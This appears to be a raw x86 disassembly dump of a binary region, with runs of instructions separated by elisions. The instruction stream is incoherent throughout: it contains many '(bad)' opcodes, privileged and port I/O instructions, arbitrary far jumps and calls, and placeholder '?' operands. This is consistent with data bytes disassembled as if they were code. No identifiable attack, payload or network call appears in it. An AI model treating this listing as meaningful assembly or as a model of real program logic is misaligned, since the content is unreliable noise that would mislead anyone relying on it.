  4242ee:	mov    ecx,0x3231654a
  4242f3:	fstp   TBYTE PTR [edx-0x62d42709]
  4242f9:	pop    esi
  4242fa:	ja     0x4242b9
  4242fc:	dec    esp
  4242fd:	repnz add DWORD PTR [eax],ebp
  424300:	add    ah,BYTE PTR [esi]
  424302:	aas    
  424303:	jnp    0x42434d
  424305:	add    BYTE PTR [ebx],bh
  424307:	xor    edi,ecx
  424309:	jae    0x4242b1
  42430b:	pop    es
  42430c:	xor    eax,0x88529681
  424311:	xlat   BYTE PTR ds:[ebx]
  424312:	lods   eax,DWORD PTR ds:[esi]
  424313:	scas   eax,DWORD PTR es:[edi]
  424314:	cmp    eax,0x1af956a1
  424319:	mov    ebx,0x7b01aecf
  42431e:	repnz add al,0x6b
  424321:	mov    al,BYTE PTR [ebx-0x80]
  424324:	pop    ds
  424325:	out    dx,eax
  424326:	adc    dl,dl
  424328:	pop    edi
  424329:	xor    DWORD PTR [ecx-0x20],esp
  42432c:	stos   DWORD PTR es:[edi],eax
  42432d:	les    ebp,FWORD PTR [eax-0x3d]
  424330:	xchg   BYTE PTR [eax+0x694d964f],ch
  424336:	das    
  424337:	cmp    BYTE PTR [ebx+0x7f],al
  42433a:	cmp    ebx,DWORD PTR [eax-0x10]
  42433d:	sub    bl,BYTE PTR [edi+0x68a81bcb]
  424343:	stc    
  424344:	fimul  WORD PTR ds:[eax]
  424347:	fidiv  DWORD PTR [ebp-0x2c1e2284]
  42434d:	(bad)  
  42434f:	dec    eax
  424350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424351:	int    0xfc
  424353:	mov    eax,0x554e284d
  424358:	pop    ds
  424359:	jp     0x42438b
  42435b:	mov    ebx,0x375de385
  424360:	push   ebx
  424361:	sar    DWORD PTR [ebx],0xad
  424364:	jmp    0x4243bc
  424366:	sub    eax,DWORD PTR [eax]
  424368:	jecxz  0x4243d5
  42436a:	mov    edx,0x4d86ce29
  42436f:	xor    eax,esi
  424371:	push   0xffffffef
  424373:	lods   al,BYTE PTR ds:[esi]
  424374:	sar    DWORD PTR [eax+eiz*4+0x13bb7f61],1
  42437b:	aaa    
  42437c:	add    al,ch
  42437e:	ret    
  42437f:	dec    ebx
  424380:	dec    edi
  424381:	mov    si,0xd6fa
  424385:	clc    
  424386:	into   
  424387:	inc    ebx
  424388:	xor    edx,esi
  42438a:	(bad)  
  42438b:	pop    esp
  42438c:	pop    eax
  42438d:	in     eax,0x49
  42438f:	dec    eax
  424390:	push   es
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424464
  424401:	pop    ebp
  424402:	ins    DWORD PTR es:[edi],dx
  424403:	xchg   edi,eax
  424404:	inc    edx
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0xf0000001
  42440d:	test   al,0xf4
  42440f:	inc    ebp
  424410:	push   0x7a
  424412:	mov    eax,ds:0x6a1066d3
  424417:	not    DWORD PTR [esi+0x2d3f9c7a]
  42441d:	lahf   
  42441e:	dec    ebp
  42441f:	aam    0xe
  424421:	repz mov dl,0x95
  424424:	pop    ebp
  424425:	adc    eax,0x5c121f97
  42442a:	fsub   QWORD PTR [edx]
  42442c:	sbb    ebp,esp
  42442e:	add    DWORD PTR [esi-0x14],eax
  424431:	jle    0x42443c
  424433:	hlt    
  424434:	in     eax,dx
  424435:	nop
  424436:	cld    
  424437:	gs sbb eax,0xb2983717
  42443d:	cmp    eax,0xb9df887b
  424442:	cs push 0x6a9f90d
  424448:	in     al,dx
  424449:	ror    DWORD PTR [ecx+0x6546c4b4],0x88
  424450:	test   DWORD PTR [ecx-0x628f3037],0x4713dc54
  42445a:	fwait
  42445b:	sbb    eax,0x1f213c1f
  424460:	call   0x6eed5e45
  424465:	xchg   edi,eax
  424466:	cmp    DWORD PTR [ecx-0xdb3099],ecx
  42446c:	inc    ebp
  42446d:	gs mov ebx,0x12f838a0
  424473:	xor    esi,DWORD PTR [eax+edi*1]
  424476:	inc    esi
  424477:	dec    esp
  424478:	sahf   
  424479:	fiadd  WORD PTR [edx]
  42447b:	mov    eax,ds:0x6da7ea4a
  424480:	mov    esp,esp
  424482:	aaa    
  424483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424484:	jg     0x4244c3
  424486:	jmp    0x424505
  424488:	pop    ebp
  424489:	mov    ecx,0xd1ddd8fe
  42448e:	aam    0x9
  424490:	cli    
  424491:	pop    ss
  424492:	pop    ecx
  424493:	inc    esi
  424494:	sar    DWORD PTR [ebx-0x1d791cc8],0xdc
  42449b:	add    BYTE PTR [ecx-0x5d250f69],dh
  4244a1:	mov    ebp,0x961c1bd1
  4244a6:	neg    al
  4244a8:	dec    edx
  4244a9:	adc    dl,ah
  4244ab:	dec    edi
  4244ac:	ss int 0x5
  4244af:	push   edi
  4244b0:	inc    edi
  4244b1:	xor    dl,BYTE PTR [eax-0x6edcdd75]
  4244b7:	add    al,0x9b
  4244b9:	xchg   esp,eax
  4244ba:	pop    es
  4244bb:	cdq    
  4244bc:	xchg   ecx,eax
  4244bd:	dec    esp
  4244be:	pop    esi
  4244bf:	aas    
  4244c0:	mov    al,0xf4
  4244c2:	loopne 0x42445d
  4244c4:	jb     0x42447e
  4244c6:	mov    bh,0xf0
  4244c8:	sahf   
  4244c9:	add    al,0x16
  4244cb:	lods   al,BYTE PTR ds:[esi]
  4244cc:	sub    bh,BYTE PTR [edx-0x2240e509]
  4244d2:	pop    esi
  4244d3:	ja     0x4244b7
  4244d5:	retf   0x1d7b
  4244d8:	shl    BYTE PTR [esi],0x16
  4244db:	mov    eax,0x9d714a65
  4244e0:	(bad)  
  4244e1:	neg    esp
  4244e3:	pop    ebp
  4244e4:	dec    esp
  4244e5:	es out 0xda,eax
  4244e8:	and    esi,DWORD PTR [esi-0x6511a2ee]
  4244ee:	xchg   ebp,eax
  4244ef:	sub    BYTE PTR [ebp+0x4ff71c9f],ah
  4244f5:	imul   edx,edi,0x836990a7
  4244fb:	lods   eax,DWORD PTR ds:[esi]
  4244fc:	test   al,0xfc
  4244fe:	fist   DWORD PTR [edx-0x167045a8]
  424504:	hlt    
  424505:	dec    esp
  424506:	inc    ebx
  424507:	dec    ebx
  424508:	pop    es
  424509:	lahf   
  42450a:	mov    ebx,0xf02d5457
  42450f:	cmp    eax,0x36
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x52],1
  424581:	sub    al,0xd5
  424583:	jp     0x4245cc
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0xee000001,al
  42458d:	jmp    0x424529
  42458f:	hlt    
  424590:	repnz mov ds,WORD PTR [ecx-0xb]
  424594:	and    DWORD PTR [ecx+0x2fd605f7],ebp
  42459a:	(bad)  [edx+0x24459fbc]
  4245a0:	push   DWORD PTR ds:0x452fea8b
  4245a6:	(bad)  
  4245a7:	xchg   esp,eax
  4245a8:	mov    ah,0x1b
  4245aa:	popa   
  4245ab:	in     al,0x94
  4245ad:	sbb    bl,cl
  4245af:	mov    ah,0x3b
  4245b1:	fcom   QWORD PTR [edx+0x7a]
  4245b4:	test   BYTE PTR [eax-0x1c],dl
  4245b7:	and    BYTE PTR [edx-0x1c],al
  4245ba:	sbb    eax,0x64197f50
  4245bf:	mov    bh,0x5f
  4245c1:	adc    al,0x4f
  4245c3:	icebp  
  4245c4:	add    esi,DWORD PTR [ebx-0x6ebff5d2]
  4245ca:	test   al,0xaa
  4245cc:	dec    edi
  4245cd:	inc    esp
  4245ce:	inc    eax
  4245cf:	mov    ds:0x441b6801,al
  4245d4:	mov    edi,0x56dd885b
  4245d9:	mov    DWORD PTR [ebx+0x6c976071],edx
  4245df:	ror    DWORD PTR [eax],cl
  4245e1:	jmp    0x60403f71
  4245e6:	and    eax,0x126c6fdd
  4245eb:	jg     0x4245b0
  4245ed:	mov    ebp,0x309c8efd
  4245f2:	dec    edi
  4245f3:	mov    edx,0x9ebd729
  4245f8:	pop    ds
  4245f9:	xor    edx,DWORD PTR [ecx-0x6f]
  4245fc:	aam    0x8
  4245fe:	retf   0xccf7
  424601:	dec    ebp
  424602:	std    
  424603:	mov    ds:0x5b31e091,eax
  424608:	lock ficom DWORD PTR [esi]
  42460b:	jae    0x4245bc
  42460d:	lods   eax,DWORD PTR ds:[esi]
  42460e:	pop    ecx
  42460f:	test   DWORD PTR [edi-0x3e39f95f],ecx
  424615:	push   ds
  424616:	mov    bl,0x41
  424618:	neg    BYTE PTR [edi-0x52]
  42461b:	adc    al,0xcf
  42461d:	jle    0x4245d2
  42461f:	into   
  424620:	lods   eax,DWORD PTR ds:[esi]
  424621:	xor    ebx,DWORD PTR [ebx+0x7f]
  424624:	cdq    
  424625:	sbb    ch,BYTE PTR [ebp-0x1567938a]
  42462b:	icebp  
  42462c:	jnp    0x4245bb
  42462e:	je     0x4245e7
  424630:	adc    al,BYTE PTR ds:0x88eea4f7
  424636:	adc    al,0x4d
  424638:	ja     0x42469e
  42463a:	add    BYTE PTR ds:0x2abb9634,dl
  424640:	lea    esi,[eax*4-0x1e0506ce]
  424647:	ret    0x6ad5
  42464a:	outs   dx,BYTE PTR ds:[esi]
  42464b:	scas   al,BYTE PTR es:[edi]
  42464c:	pop    ecx
  42464d:	sahf   
  42464e:	add    eax,0x2b86ad3b
  424653:	imul   ebx,DWORD PTR [edi],0xffffffd3
  424656:	sbb    dl,BYTE PTR fs:[edx-0x8]
  42465a:	popf   
  42465b:	xchg   edi,eax
  42465c:	adc    dl,BYTE PTR [esi]
  42465e:	pop    ebp
  42465f:	xor    eax,0x53964018
  424664:	ret    
  424665:	jns    0x42462a
  424667:	jg     0x4246ae
  424669:	sbb    al,0xa4
  42466b:	push   0xde70d247
  424670:	jb     0x4246bb
  424672:	pop    eax
  424673:	sbb    eax,0x5644d6ed
  424678:	popf   
  424679:	sbb    al,0xc2
  42467b:	(bad)  
  42467c:	cwde   
  42467d:	cmp    ebx,DWORD PTR [edi+0xd]
  424680:	pop    ds
  424681:	iret   
  424682:	mul    DWORD PTR [ecx+0x7e]
  424685:	(bad)  
  424686:	fidiv  DWORD PTR [ebx+0x17]
  424689:	fst    DWORD PTR [eax+0x26]
  42468c:	js     0x4246b9
  42468e:	or     eax,0xd1b2
	...
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    ah,al
  424701:	pop    esi
  424702:	fs push ss
  424704:	dec    esp
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x61000001,al
  42470d:	dec    edi
  42470e:	mov    cl,0x50
  424710:	dec    edx
  424711:	pop    edx
  424712:	or     BYTE PTR [edi],cl
  424714:	sbb    eax,0x16651fbf
  424719:	sbb    esp,DWORD PTR [eax]
  42471b:	(bad)  
  42471c:	add    ah,BYTE PTR [ebx-0x6b]
  42471f:	inc    ebp
  424720:	enter  0x3cb7,0x3c
  424724:	ins    BYTE PTR es:[edi],dx
  424725:	inc    edi
  424726:	retf   
  424727:	lods   eax,DWORD PTR ds:[esi]
  424728:	shl    DWORD PTR [eax-0x575dae89],cl
  42472e:	sti    
  42472f:	aad    0xf
  424731:	mov    ebp,0xa4f1b411
  424736:	cmp    al,bl
  424738:	adc    bh,ch
  42473a:	and    ecx,DWORD PTR [ebx-0x5d]
  42473d:	inc    ecx
  42473e:	mov    al,ds:0xa389081
  424743:	jno    0x4246e6
  424745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424747:	or     eax,0x18a1e143
  42474c:	pop    ebp
  42474d:	stos   BYTE PTR es:[edi],al
  42474e:	popa   
  42474f:	addr16 pop ecx
  424751:	push   edx
  424752:	shl    DWORD PTR [eax+eax*8],1
  424755:	inc    esp
  424756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424757:	bound  ecx,QWORD PTR ds:[ebx]
  42475a:	or     BYTE PTR [edi-0x75],al
  42475d:	mov    al,ds:0x34cbd076
  424762:	cwde   
  424763:	daa    
  424764:	mov    WORD PTR [esi+0x23],cs
  424767:	inc    esi
  424768:	or     eax,0x9c30a399
  42476d:	sbb    edi,edx
  42476f:	enter  0xe464,0xe2
  424773:	add    eax,0xa957e4c4
  424778:	xlat   BYTE PTR ds:[ebx]
  424779:	xor    BYTE PTR [eax+0x69],bh
  42477c:	dec    ecx
  42477d:	sub    eax,0xafa709ba
  424782:	sbb    DWORD PTR ds:[ebx+0x4],esi
  424786:	xor    al,0x60
  424788:	retf   
  424789:	push   ebp
  42478a:	ret    0xbd6a
  42478d:	test   BYTE PTR [edi],dh
  42478f:	(bad)
  424792:	push   0x259cb1cc
  424797:	fsub   QWORD PTR [ebx]
  424799:	fsub   st,st(1)
  42479b:	push   0x7
  42479d:	sbb    BYTE PTR [ebp+ebx*2-0x1],al
  4247a1:	pop    ebx
  4247a2:	mov    cl,0x6b
  4247a4:	lahf   
  4247a5:	sti    
  4247a6:	mov    edi,0x27ec1976
  4247ab:	shl    DWORD PTR [edi],0x34
  4247ae:	xchg   esp,eax
  4247af:	pop    esi
  4247b0:	xchg   edx,eax
  4247b1:	mov    cl,0xa6
  4247b3:	cmp    DWORD PTR [esi+0x4dd3e4fb],ebp
  4247b9:	pop    ss
  4247ba:	stc    
  4247bb:	mov    cl,0x6
  4247bd:	lods   eax,DWORD PTR ds:[esi]
  4247be:	jmp    0x4247fc
  4247c0:	adc    eax,0xee1a5699
  4247c5:	das    
  4247c6:	enter  0x7ef6,0x3a
  4247ca:	pop    es
  4247cb:	mov    dl,0x47
  4247cd:	mov    WORD PTR [edi+0x50e692ef],?
  4247d3:	add    al,0x23
  4247d5:	and    esi,DWORD PTR [ebx+0x52]
  4247d8:	push   eax
  4247d9:	(bad)  
  4247da:	ror    BYTE PTR [ebx+0x34],cl
  4247dd:	cmp    al,0x57
  4247df:	mov    ebp,0xc9fcc4ed
  4247e4:	inc    bh
  4247e6:	sub    al,cl
  4247e8:	popa   
  4247e9:	or     DWORD PTR [esi],edi
  4247eb:	mov    bl,0x5c
  4247ed:	(bad)  
  4247ee:	enter  0xff35,0x4e
  4247f2:	stos   BYTE PTR es:[edi],al
  4247f3:	mov    eax,ds:0x7670f61e
  4247f8:	xchg   esp,eax
  4247f9:	add    al,0xc6
  4247fb:	sbb    ch,BYTE PTR [edx+0x53524f01]
  424801:	push   ecx
  424802:	mov    ebx,0x92fa8070
  424807:	jl     0x4247ca
  424809:	out    dx,eax
  42480a:	outs   dx,DWORD PTR ds:[esi]
  42480b:	outs   dx,DWORD PTR ds:[esi]
  42480c:	pop    ss
  42480d:	aad    0x4a
  42480f:	cmp    esp,DWORD PTR [edi+0x0]
	...
  424872:	add    BYTE PTR [eax],al
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	mov    DWORD PTR [ebp+0x53],ebx
  424883:	sub    DWORD PTR [ecx-0x7a],edx
  424886:	add    DWORD PTR [eax],eax
  424888:	add    eax,0xb2000001
  42488d:	jo     0x4248d8
  42488f:	fld    QWORD PTR [edi]
  424891:	xlat   BYTE PTR ds:[ebx]
  424892:	(bad)  
  424893:	pop    ss
  424894:	mov    esp,0xc6d48ab1
  424899:	stos   DWORD PTR es:[edi],eax
  42489a:	sub    eax,0x1135703b
  42489f:	fdiv   QWORD PTR [ecx+0x6538770a]
  4248a5:	adc    BYTE PTR [ebp+0x50],ch
  4248a8:	std    
  4248a9:	aad    0xc
  4248ab:	cmp    edi,DWORD PTR ds:0x6671642a
  4248b1:	imul   eax,DWORD PTR [eax+0x2dbdd4e6],0xffffffc1
  4248b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248b9:	or     DWORD PTR [esi+ebp*8+0x1fd4150c],0x94205c2e
  4248c4:	sub    dh,ch
  4248c6:	fdivrp st(4),st
  4248c8:	inc    edi
  4248c9:	outs   dx,DWORD PTR ds:[esi]
  4248ca:	mov    cl,0x69
  4248cc:	leave  
  4248cd:	std    
  4248ce:	jne    0x4248ef
  4248d0:	pop    ebx
  4248d1:	mov    eax,ds:0x2650f2c5
  4248d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248d7:	cmp    al,0xde
  4248d9:	jnp    0x424956
  4248db:	hlt    
  4248dc:	and    ebx,DWORD PTR [esi+0x4d]
  4248df:	out    dx,eax
  4248e0:	inc    edx
  4248e1:	and    ecx,0x5a
  4248e4:	xchg   ebx,eax
  4248e5:	xor    edx,DWORD PTR [ebp-0x18572936]
  4248eb:	jmp    0xad296d00
  4248f0:	out    0xf7,al
  4248f2:	jno    0x42491d
  4248f4:	mov    DWORD PTR [di],ecx
  4248f7:	jne    0x42495f
  4248f9:	aad    0xfa
  4248fb:	pop    esi
  4248fc:	push   ds
  4248fd:	cmp    DWORD PTR [ecx],0x4984dcd0
  424903:	shl    BYTE PTR [edx+eax*4+0x17],cl
  424907:	out    0x42,eax
  424909:	daa    
  42490a:	jnp    0x424958
  42490c:	mov    eax,0xb018cdf7
  424911:	and    eax,0x5606a58b
  424916:	jo     0x4248b5
  424918:	or     BYTE PTR ds:0x1c36f3d0,ch
  42491e:	pusha  
  42491f:	test   al,0x33
  424921:	sbb    bh,al
  424923:	div    DWORD PTR [edx+0x2520a8ca]
  424929:	jecxz  0x424999
  42492b:	nop
  42492c:	rol    DWORD PTR [eax-0x5a],0x9d
  424930:	or     al,0xa3
  424932:	push   edx
  424933:	pop    ebx
  424934:	pop    ebp
  424935:	jecxz  0x4249a8
  424937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424938:	adc    bh,BYTE PTR [ebx-0x6f]
  42493b:	(bad)  
  42493c:	cmp    BYTE PTR [ecx+0x7f2ccc84],dh
  424942:	add    al,0x8d
  424944:	and    eax,DWORD PTR [edi+0x1b]
  424947:	gs ja  0x42497c
  42494a:	mov    ?,WORD PTR [ebx+eax*4-0x751e78a9]
  424951:	add    ebx,edi
  424953:	sbb    ebp,DWORD PTR [edi-0x2e0825f5]
  424959:	out    dx,al
  42495a:	shl    BYTE PTR [edx],1
  42495c:	fld    TBYTE PTR [esi]
  42495e:	mov    ecx,DWORD PTR [ebx+edx*4-0x7f7c5ba8]
  424965:	aas    
  424966:	and    eax,0xf905b512
  42496b:	push   ss
  42496c:	js     0x42490a
  42496e:	mov    WORD PTR [ebx],cs
  424970:	adc    dh,BYTE PTR [ecx-0x4bc67c28]
  424976:	and    ah,BYTE PTR [esi]
  424978:	int3   
  424979:	test   DWORD PTR [ecx],ebx
  42497b:	add    BYTE PTR [ecx-0x6892bd3a],dh
  424981:	cmp    DWORD PTR [ecx-0x1d],edx
  424984:	xor    DWORD PTR [ecx*8+0x3f469b42],ebp
  42498b:	push   ecx
  42498c:	mov    WORD PTR [edx-0x80],gs
  42498f:	mov    bh,0x1b
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bh,BYTE PTR [esi+0x565fab91]
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0x84000001,al
  424a0d:	sbb    BYTE PTR [ebp+0x23],dh
  424a10:	sbb    BYTE PTR [ebx-0x2f352462],dl
  424a16:	daa    
  424a17:	inc    edx
  424a18:	jle    0x424a09
  424a1a:	cld    
  424a1b:	icebp  
  424a1c:	push   esi
  424a1d:	xchg   esi,eax
  424a1e:	push   ds
  424a1f:	fsub   QWORD PTR [edx-0x1c]
  424a22:	lea    edx,[edx]
  424a24:	div    DWORD PTR [edx-0x69b720f8]
  424a2a:	arpl   WORD PTR [edx-0x1e95d7c3],si
  424a30:	xchg   BYTE PTR [ebx],dl
  424a32:	(bad)  
  424a33:	jl     0x424a40
  424a35:	or     dh,BYTE PTR ds:0xe1fdf344
  424a3b:	mov    bl,0x37
  424a3d:	mov    eax,0xe82fa217
  424a42:	jmp    0xbeef:0x8bf8d2cc
  424a49:	ja     0x4249fc
  424a4b:	pop    edi
  424a4c:	addr16 dec edi
  424a4e:	dec    edx
  424a4f:	pop    edi
  424a50:	sbb    BYTE PTR [esi-0x6c6e3c54],bl
  424a56:	jne    0x4249df
  424a58:	pop    eax
  424a59:	push   ss
  424a5a:	(bad)  
  424a5b:	addr16 mov ch,0xe6
  424a5e:	fs mov bl,0x35
  424a61:	mov    dh,BYTE PTR [eax-0x5f]
  424a64:	and    ah,BYTE PTR [esi]
  424a66:	sbb    al,BYTE PTR [edi-0x42]
  424a69:	(bad)  
  424a6b:	les    edx,FWORD PTR [edx-0x7b189bb7]
  424a71:	xchg   edx,eax
  424a72:	dec    ecx
  424a73:	cmp    DWORD PTR [eax],esp
  424a75:	div    DWORD PTR [ecx+eiz*2]
  424a78:	jle    0x424aa4
  424a7a:	retf   0x197c
  424a7d:	mov    ecx,DWORD PTR [edx]
  424a7f:	pop    ebp
  424a80:	scas   eax,DWORD PTR es:[edi]
  424a81:	loopne 0x424ac8
  424a83:	xchg   esi,eax
  424a84:	mov    bl,0x8e
  424a86:	jg     0x424acc
  424a88:	or     esp,DWORD PTR [ecx+0x5d9754bb]
  424a8e:	mov    ebx,edi
  424a90:	out    0x1f,al
  424a92:	(bad)  [esi]
  424a94:	jg     0x424a73
  424a96:	iret   
  424a97:	cmp    DWORD PTR [eax-0x3e91515f],esp
  424a9d:	add    al,0xbc
  424aa0:	stc    
  424aa1:	loope  0x424add
  424aa3:	add    DWORD PTR [ebp+0x7b],edi
  424aa6:	stos   BYTE PTR es:[edi],al
  424aa7:	nop
  424aa8:	or     BYTE PTR [edx-0x34],bh
  424aab:	mov    bh,BYTE PTR [edx-0x59]
  424aae:	pop    edx
  424aaf:	test   BYTE PTR [edi-0x10fe4f36],0xe5
  424ab6:	lahf   
  424ab7:	dec    edx
  424ab8:	add    BYTE PTR [eax],ch
  424aba:	(bad)  
  424abb:	ja     0x424a60
  424abd:	mov    esp,0x6b624fa7
  424ac2:	js     0x424abb
  424ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ac5:	pop    edi
  424ac6:	aas    
  424ac7:	xor    bh,cl
  424ac9:	nop
  424aca:	xchg   ebx,eax
  424acb:	push   esp
  424acc:	sbb    al,0x7
  424ace:	fs scas al,BYTE PTR es:[edi]
  424ad0:	call   0xc2fe:0x76488cc
  424ad7:	mov    ds:0x57a6fe37,eax
  424adc:	loopne 0x424a71
  424ade:	(bad)  
  424adf:	pop    ss
  424ae0:	and    ebp,DWORD PTR [eax+0x1b99ec3d]
  424ae6:	mov    edi,0x58ca4f86
  424aeb:	and    al,0x70
  424aed:	jecxz  0x424ae2
  424aef:	pop    es
  424af0:	push   eax
  424af1:	stos   BYTE PTR es:[edi],al
  424af2:	int3   
  424af3:	bound  ecx,QWORD PTR [eax+0x72]
  424af6:	cmp    BYTE PTR [esi],dh
  424af8:	sub    al,0xa8
  424afa:	add    DWORD PTR [esi-0x13],edi
  424afd:	xor    ebp,DWORD PTR [ecx]
  424aff:	dec    edi
  424b00:	ins    DWORD PTR es:[edi],dx
  424b01:	jb     0x424ae3
  424b03:	sub    ebx,0x48858749
  424b09:	xchg   edi,eax
  424b0a:	je     0x424afb
  424b0c:	and    al,0xef
  424b0e:	mov    esi,0x75a5
	...
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	(bad)  
  424b81:	mov    ah,0x25
  424b83:	adc    eax,0x1885b
  424b88:	add    eax,0x63000001
  424b8d:	int    0x87
  424b8f:	cdq    
  424b90:	inc    edi
  424b91:	mov    BYTE PTR [eax],ch
  424b93:	or     eax,0xdbeca34d
  424b98:	pop    edx
  424b99:	arpl   WORD PTR [ebp-0x55aebc92],ax
  424b9f:	add    al,0x59
  424ba1:	and    DWORD PTR [edi],eax
  424ba3:	dec    eax
  424ba4:	icebp  
  424ba5:	test   DWORD PTR [edx+0x610bdb2],edx
  424bab:	dec    esp
  424bac:	not    DWORD PTR [ebp-0x32c102e9]
  424bb2:	sub    BYTE PTR [eiz*4-0x7a9899b7],bl
  424bb9:	mov    edx,0x6209c17
  424bbe:	stc    
  424bbf:	sub    al,0x23
  424bc1:	popa   
  424bc2:	push   ss
  424bc3:	gs mov ebx,0x6f5052fd
  424bc9:	add    al,0x8d
  424bcb:	cmp    DWORD PTR [ecx-0x67fdb598],esp
  424bd1:	test   BYTE PTR [ebx],0xd1
  424bd4:	cdq    
  424bd5:	add    BYTE PTR [ebp-0x5bb5f220],ch
  424bdb:	push   ebx
  424bdc:	inc    ebx
  424bdd:	add    eax,0xf71bf48d
  424be2:	xchg   BYTE PTR [ebx],al
  424be4:	daa    
  424be5:	mov    ds:0xa84e1aa9,al
  424bea:	leave  
  424beb:	hlt    
  424bec:	mov    ebp,DWORD PTR [esi+0x7f16e736]
  424bf2:	sbb    DWORD PTR [esi],edx
  424bf4:	sbb    al,0x74
  424bf6:	imul   BYTE PTR [eax+0x1]
  424bf9:	popf   
  424bfa:	sub    ch,BYTE PTR [edi+0x6df7835b]
  424c00:	sub    eax,0x7e8389c6
  424c05:	push   DWORD PTR [esi]
  424c07:	mov    ds:0xd0ba559,eax
  424c0c:	inc    esi
  424c0d:	push   eax
  424c0e:	mov    bl,0x58
  424c10:	ret    
  424c11:	adc    ebx,DWORD PTR [esi-0x78d0a43b]
  424c17:	in     eax,dx
  424c18:	test   al,0xc2
  424c1a:	mov    DWORD PTR [eax],esp
  424c1c:	jns    0x424c38
  424c1e:	aad    0xcd
  424c20:	fsub   QWORD PTR ds:0x6217052f
  424c26:	push   es
  424c27:	pop    ebp
  424c28:	mov    ch,bh
  424c2a:	test   BYTE PTR [ebx+0x320632c1],cl
  424c30:	xchg   esp,eax
  424c31:	or     eax,0x8432ca11
  424c36:	outs   dx,DWORD PTR ds:[esi]
  424c37:	int3   
  424c38:	(bad)  
  424c39:	cmp    esi,DWORD PTR [ebx-0x1b5365bc]
  424c3f:	or     esi,ebx
  424c41:	outs   dx,DWORD PTR ds:[esi]
  424c42:	push   cs
  424c43:	inc    ebx
  424c44:	sub    DWORD PTR [edi+0x48c7c028],eax
  424c4a:	ins    DWORD PTR es:[edi],dx
  424c4b:	stos   DWORD PTR es:[edi],eax
  424c4c:	dec    BYTE PTR [esi-0x14cf32a0]
  424c52:	inc    ebp
  424c53:	xor    eax,0xca165cdd
  424c58:	rol    DWORD PTR [eax+edi*4],cl
  424c5b:	xchg   BYTE PTR [edx-0x14],cl
  424c5e:	cmp    eax,DWORD PTR [ecx+ebx*4-0x2fc30cb7]
  424c65:	add    edi,DWORD PTR [eax-0x944cc2d]
  424c6b:	mov    dh,ah
  424c6d:	cld    
  424c6e:	or     esi,0x24b9dbff
  424c74:	adc    ch,bl
  424c76:	lods   eax,DWORD PTR ds:[esi]
  424c77:	in     al,0xc7
  424c79:	mov    esp,DWORD PTR [ecx+0x18a1d1b5]
  424c7f:	hlt    
  424c80:	pop    esp
  424c81:	ja     0x424c25
  424c83:	mul    DWORD PTR [ecx+0x680c6939]
  424c89:	sbb    al,cl
  424c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c8c:	fucomp st(0)
  424c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c8f:	retf   
  424c90:	inc    BYTE PTR [eax]
	...
  424cf2:	add    BYTE PTR [eax],al
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx+0x7b1f51a8]
  424d02:	sub    BYTE PTR [ecx+0x60],bl
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0xe0000001,al
  424d0d:	mov    edx,0x11ae9368
  424d12:	lock mov esi,0x4317744c
  424d18:	jns    0x424d2c
  424d1a:	loope  0x424d14
  424d1c:	idiv   DWORD PTR [ebx+0x5d]
  424d1f:	or     ebp,ebx
  424d21:	dec    ebx
  424d22:	xchg   edx,eax
  424d23:	scas   eax,DWORD PTR es:[edi]
  424d24:	pop    ds
  424d25:	call   0x365f:0x57b50d2f
  424d2c:	scas   al,BYTE PTR es:[edi]
  424d2d:	pop    ebx
  424d2e:	adc    eax,DWORD PTR [esi]
  424d30:	jmp    0xc09a6605
  424d35:	or     eax,0xfef68963
  424d3a:	or     dl,BYTE PTR [ebp-0x33c6522a]
  424d40:	inc    esp
  424d41:	loopne 0x424d58
  424d43:	bound  esi,QWORD PTR [edi]
  424d45:	rcl    BYTE PTR [esi-0x4c41941d],1
  424d4b:	xor    ah,BYTE PTR [ecx+0x56]
  424d4e:	xchg   ebp,eax
  424d4f:	dec    esi
  424d50:	sub    ch,BYTE PTR ds:0x694dae15
  424d56:	loop   0x424d08
  424d58:	xchg   DWORD PTR [eax+0x6f],edi
  424d5b:	mov    ds:0x474f87e9,eax
  424d60:	out    0x6e,eax
  424d62:	push   0x1fd78043
  424d67:	push   edx
  424d68:	mov    eax,ds:0xa4d0c9ef
